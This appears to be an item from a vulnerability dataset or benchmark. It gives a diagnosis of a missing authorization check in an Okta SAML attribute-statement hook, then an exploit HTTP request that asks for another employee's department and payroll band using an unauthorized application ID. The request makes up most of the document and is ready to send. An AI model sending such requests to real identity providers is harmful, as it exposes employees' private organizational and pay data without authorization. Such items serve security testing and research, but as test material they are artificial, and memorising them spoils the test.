diagnosis: The Okta SAML attribute statement hook accepts subjectNameId and targetAppId from the request body and returns internal department and payroll band metadata without verifying that the requesting application or entity ID is authorized to query that subject, leaking employee organizational details.
exploit_request:
POST /api/okta/saml/attributes HTTP/1.1
Host: saml-provider.internal:9008
Content-Type: application/json

{
  "subjectNameId": "john.doe@enterprise.com",
  "targetAppId": "app_unauthorized_external"
}
